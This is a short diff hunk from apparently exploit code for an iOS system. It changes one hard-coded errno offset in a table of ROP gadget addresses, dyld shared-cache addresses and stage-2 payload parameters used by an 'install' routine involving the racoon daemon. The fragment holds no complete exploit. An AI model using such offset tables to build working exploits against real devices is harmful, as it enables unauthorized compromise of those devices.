@@ -47,7 +47,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
     myoffsets.new_cache_addr = 0x1c0000000;
     myoffsets.cache_text_seg_size = 0x30000000;
-    myoffsets.errno_offset = 0x1b30f1000+0xff8;
+    myoffsets.errno_offset = 0x1f30f1000+0xff8;
     myoffsets.mach_msg_offset = 0x1f1896018;
     myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
     myoffsets.stage2_max_size = 0x200000;
